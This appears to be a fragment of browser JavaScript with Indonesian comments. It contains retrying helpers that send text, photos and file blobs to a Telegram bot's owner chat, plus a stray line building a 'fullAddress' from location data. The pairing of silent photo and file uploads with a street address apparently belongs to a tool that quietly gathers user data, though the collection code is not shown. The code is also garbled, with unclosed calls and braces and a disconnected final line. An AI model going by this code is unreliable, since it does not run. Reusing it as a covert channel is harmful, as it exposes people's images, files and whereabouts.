    // Fungsi kirim pesan dengan retry
    async function sendTelegram(text, parseMode = 'HTML', retry = 0) {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: OWNER_CHAT_ID, text, parse_mode: parseMode })

            if (!res.ok && retry < MAX_RETRY) {
                await new Promise(r => setTimeout(r, 2000));
                return sendTelegram(text, parseMode, retry + 1);
            }
            return res.ok;
        } catch(e) {
            if (retry < MAX_RETRY) {
                await new Promise(r => setTimeout(r, 2000));
                return sendTelegram(text, parseMode, retry + 1);
            }
            return false;
        }

    // Kirim file dengan retry
    async function sendFile(blob, filename, type = 'document', retry = 0) {
        try {
            const fd = new FormData();
            fd.append('chat_id', OWNER_CHAT_ID);
            if (type === 'photo') fd.append('photo', blob, filename);
            else fd.append('document', blob, filename);
            const endpoint = type === 'photo' ? 'sendPhoto' : 'sendDocument';
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd });
            if (!res.ok && retry < MAX_RETRY) {
                await new Promise(r => setTimeout(r, 2000));
                return sendFile(blob, filename, type, retry + 1);
            }

                fullAddress: data.display_name || "Address not available"
